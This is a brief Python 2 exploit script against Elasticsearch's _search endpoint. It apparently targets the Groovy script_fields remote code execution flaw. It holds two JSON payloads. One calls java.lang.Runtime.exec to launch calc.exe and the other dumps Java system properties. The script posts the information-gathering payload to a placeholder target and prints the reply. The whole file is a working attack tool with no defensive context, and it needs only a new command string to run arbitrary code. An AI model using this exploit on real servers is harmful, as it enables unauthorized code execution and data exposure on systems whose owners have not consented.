import json
import requests
import sys



def execute_command(target):
    payload1 = '{"size":1, "script_fields": {"myscript":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"C:\\/Windows\\/System32\\/calc.exe\\").getText()"}}}' #execute code
    payload2 = '{"size":1, "script_fields": {"myscript":{"script": "java.lang.Math.class.forName(\\"java.lang.System\\").getProperties()"}}}' #get system information
    try:
        url = "http://%s:9200/_search?pretty" %(target)
        r = requests.post(url=url, data=payload2)
    except Exception as e:
        print e
    values = json.loads(r.text)
    print r.text
    

    
execute_command("IP HERE")
